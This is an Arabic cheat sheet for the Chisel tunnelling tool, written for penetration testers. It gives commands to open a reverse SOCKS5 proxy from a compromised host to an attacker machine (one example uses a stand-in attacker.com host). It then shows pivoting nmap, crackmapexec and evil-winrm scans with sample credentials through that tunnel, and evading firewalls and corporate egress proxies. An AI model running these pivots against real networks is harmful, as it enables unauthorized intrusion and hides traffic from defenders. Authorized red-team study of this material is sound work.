<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 إزميل - ورقة غش كاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```
<p align="center">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</ص>

<p align="center">
  <b>⚡ نفق TCP/UDP سريع يتم نقله عبر HTTP، وتأمينه عبر SSH، وتعبئته كثنائي محمول واحد</b>
</ص>

---

## 📋 جدول المحتويات

- [المقدمة](#-المقدمة)
- [كيف يعمل](#-كيف يعمل)
- [التثبيت](#-التثبيت)
- [أوضاع الهندسة المعمارية والأنفاق](#-الهندسة المعمارية--أوضاع النفق)
- [إعداد Pentest القياسي: Reverse SOCKS5 Proxy](#-standard-pentest-setup-reverse-socks5-proxy)
  - [الخطوة 1: بدء تشغيل الخادم على المهاجم](#step-1-start-server-on-attacker)
  - [الخطوة 2: توصيل العميل من الهدف](#step-2-connect-client-from-target)
  - [الخطوة 3: تكوين سلاسل الوكلاء](#step-3-configure-proxychains)
  - [الخطوة 4: تنفيذ الأدوات عبر النفق](#step-4-execute-tools-over-the-tunnel)
- [إعادة توجيه المنفذ المحلي](#-إعادة توجيه المنفذ المحلي)
- [إعادة توجيه المنفذ البعيد (التقاط حركة المرور الواردة)](#-إعادة توجيه المنفذ البعيد-التقاط حركة المرور الواردة)
- [المصادقة وتثبيت بصمة الإصبع](#-المصادقة--تثبيت بصمة الإصبع)
- [التهرب من الخروج وتسلسل وكيل HTTP](#-egress-evasion--http-proxy-chaining)
- [إزميل مقابل Ligolo-ng مقابل SSH](#-chisel-vs-ligolo-ng-vs-ssh)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [النصائح وأفضل الممارسات](#-نصائح--أفضل-الممارسات)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
- [الموارد](#-الموارد)

---

## 🎯 المقدمة

**Chisel** عبارة عن أداة مفتوحة المصدر ومتعددة المنصات مكتوبة بلغة Go والتي تتضمن جلسات SSH الآمنة ضمن اتصالات HTTP/WebSocket القياسية.

ونظرًا لأن حركة المرور تبدو مثل اتصال HTTP/HTTPS أو WebSocket القياسي على السلك، فإن Chisel يتنقل بسهولة عبر جدران الحماية المقيدة وأنظمة فحص الحزم العميقة (DPI) ووكلاء الويب للشركات التي عادةً ما تمنع حركة مرور SSH أو VPN الخام.

### نقاط القوة الرئيسية

- 🚀 **ثنائي فردي:** يحتوي على كل من الخادم والعميل في ملف ثنائي مستقل تم تجميعه بشكل ثابت.
- 🛡️ **التهرب من جدار الحماية:** الأنفاق عبر المنفذ القياسي 80/443 أو WebSockets للاندماج في حركة مرور الويب العادية.
- 🔒 **مشفر افتراضيًا:** يستخدم تشفير SSH أسفل الغطاء (مفاتيح ECDSA وAES-GCM).
- 🔄 **SOCKS5 وإعادة توجيه المنافذ:** ينشئ وكلاء SOCKS5 عكسيين أو منافذ محلية/بعيدة محددة يتم إعادة توجيهها بسهولة.

---

## 🏗️ كيف يعمل
```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```
---

## 📥 التثبيت

### كالي لينكس
```bash
sudo apt update && sudo apt install -y chisel
```
### من المصدر (اذهب)
```bash
go install github.com/jpillora/chisel@latest
```
### تنزيل الثنائيات المترجمة مسبقًا

قم بتنزيل الثنائيات المستقلة لأنظمة Linux وWindows وmacOS من الإصدارات الرسمية:
```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```
---

## 🔄 إعداد Pentest القياسي: وكيل SOCKS5 العكسي

في اختبارات الاختراق القياسية وCTFs، يكون الجهاز المستهدف خلف جدران الحماية/NAT ولا يمكنه قبول الاتصالات الواردة المباشرة منك. يجب عليك إنشاء **وكيل SOCKS5 العكسي**.

### الخطوة 1: بدء تشغيل الخادم على المهاجم

ابدأ تشغيل خادم Chisel على المنفذ `8000` (أو `443` للتهرب) مع السماح بإعادة توجيه المنفذ العكسي:
```bash
chisel server --reverse -p 8000 -v
```
### الخطوة 2: توصيل العميل من الهدف

قم بتنفيذ العميل على الجهاز المخترق، ثم قم بالاتصال مرة أخرى بـ IP الخاص بالمهاجم وفتح وكيل SOCKS5 العكسي:

#### هدف لينكس:
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```
#### هدف ويندوز:
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```
> **النتيجة:** يقوم خادم Chisel الموجود على جهازك المهاجم بفتح المنفذ `1080` محليًا باعتباره وكيل SOCKS5 يتم توجيهه عبر الهدف!

### الخطوة 3: تكوين Proxychains

قم بتحرير `/etc/proxychains4.conf` (أو `/etc/proxychains.conf`) على جهازك المهاجم:
```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```
### الخطوة 4: تنفيذ الأدوات عبر النفق

قم بإضافة بادئة لأي أداة باستخدام `proxychains` لتوجيهها عبر المضيف الداخلي المخترق:
```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```
---

## 🔀 إعادة توجيه المنفذ المحلي

قم بإعادة توجيه منفذ داخلي محدد من خلف الهدف مباشرة إلى جهاز المهاجم المحلي الخاص بك دون الحاجة إلى وكيل SOCKS كامل.

### مثال: الوصول إلى خدمة الويب الداخلية (المنفذ 80)

الخادم على المهاجم (`192.168.1.100:8000`):
```bash
chisel server --reverse -p 8000
```
العميل على الهدف:
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```
انتقل الآن إلى `http://127.0.0.1:8080` على جهازك المهاجم لعرض خادم الويب الداخلي!

### مثال: كشف قاعدة البيانات الداخلية (MySQL 3306)

العميل على الهدف:
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```
اتصل مباشرة من محطة المهاجم الخاصة بك:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```
---

## 🌐 إعادة توجيه المنفذ عن بعد (التقاط حركة المرور الواردة)

اكشف عن منفذ على الجهاز المستهدف الذي يعود إلى الخدمة الموجودة على صندوق المهاجم الخاص بك (مفيد لخدمة الحمولات أو التقاط عمليات الاسترجاعات).
```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```
---

## 🔐 المصادقة وتثبيت بصمة الإصبع

في البيئات الحية، يمكن أن يتم الاستيلاء على منافذ Chisel المفتوحة من قبل أطراف غير مصرح بها. قم بحماية نفقك بالمصادقة:

### المصادقة (`--auth`)
```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```
### تثبيت بصمة الإصبع (`--fingerprint`)

عندما يبدأ الخادم، فإنه يطبع بصمة مفتاح SSH العام الخاص به:
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```
قم بالتحقق منه على العميل لمنع اعتراض MITM:
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```
---

## 🛡️ التهرب من الخروج وتسلسل بروكسي HTTP

إذا كان الهدف الداخلي لا يمكنه الوصول إلى الإنترنت إلا من خلال وكيل الشركة المعتمد:
```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```
---

## ⚖️ Chisel vs Ligolo-ng vs SSH

| ميزة | إزميل | ليجولو-نغ | نفق SSH |
|---------|------------|---------------|----------|
| **الطريقة الأساسية** | SOCKS5 وإعادة توجيه المنافذ | واجهة TUN (VPN) | SOCKS5 وإعادة توجيه المنافذ |
| **بروتوكول النقل** | HTTP / ويب سوكيت | TLS الخام | SSH (المنفذ 22) |
| **التهرب من جدار الحماية** | ⭐⭐⭐⭐⭐ استثنائي | ⭐⭐⭐⭐ جيد جدًا | ⭐⭐ ضعيف (عادةً ما يكون المنفذ 22 مسدودًا) |
| **يتطلب الجذر/المسؤول**| ❌ لا (أرض المستخدم فقط) | ✅ نعم (لإنشاء جهاز TUN) | ❌ لا |
| **Nmap SYN Scan (`-sS`)**| ❌ لا | ✅ نعم | ❌ لا |
| **دعم UDP** | جزئي (عبر SOCKS5) | ✅ UDP أصلي كامل | ❌ محدودة جداً |

---

## 📊 جدول مرجعي سريع

| الوضع | الأمر | الغرض |
|------|---------|---------|
| **الخادم (عكسي)** | `chisel server --reverse -p 8000` | ابدأ الاستماع للخادم العكسي على 8000 |
| ** العميل (عكس SOCKS5) ** | `chisel client <IP>:8000 R:1080:socks` | قم بإنشاء SOCKS5 عكسي على منفذ المهاجم 1080 |
| **العميل (المنفذ الأمامي)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | قم بتعيين منفذ الهدف 80 إلى منفذ المهاجم 8080 |
| **العميل (فضح منفذ المهاجم)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | افتح المنفذ 4444 على التوجيه المستهدف للمهاجم |
| **خادم المصادقة** | `chisel server --reverse --auth "u:p" -p 8000` | تتطلب بيانات الاعتماد من ربط العملاء |
| **عميل المصادقة** | `chisel client --auth "u:p" <IP>:8000 R:socks` | تواصل مع بيانات الاعتماد |
| ** ضبط البقاء على قيد الحياة ** | `chisel client --keepalive 10s <IP>:8000 R:socks`| منع المتسربين من جلسة العمل الخاملة لجدار الحماية |

---

## 💡 النصائح وأفضل الممارسات

1. **استخدم المنفذ 443 لأقصى قدر من المراوغة:**
   غالبًا ما تقوم جدران الحماية بفحص حركة المرور على منافذ عشوائية مثل 8000 أو 8080. ويضمن تشغيل خادم Chisel على المنفذ `443` أن تبدو حركة المرور متطابقة مع HTTPS WebSockets.
2. **ضبط مهلة سلاسل الوكلاء:**
   إذا كانت اتصالات سلاسل الوكيل تبدو بطيئة، فقم بتحرير `/etc/proxychains4.conf` وقم بتعيين:
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **لا توجد امتيازات الجذر مطلوبة على الهدف:**
   على عكس حلول VPN أو TUN، يعمل Chisel في مساحة المستخدم فقط. يمكنك تشغيل `chisel.exe` أو `chisel` كحسابات خدمة ذات امتيازات منخفضة (`www-data`، `nobody`، مستخدم Windows القياسي).

---

## ⚠️إخلاء المسؤولية القانونية

> **هام:** تم تصميم Chisel لاختبار الشبكة المعتمد ومحاكاة الفريق الأحمر وإدارة الأنظمة. إن نشر أدوات الأنفاق على شبكات غير مصرح بها ينتهك قوانين أمان الكمبيوتر.

---

## 📚 المصادر

- [مستودع Chisel GitHub](https://github.com/jpillora/chisel)
- [مشروع Proxychains-NG](https://github.com/rofl0r/proxychains-ng)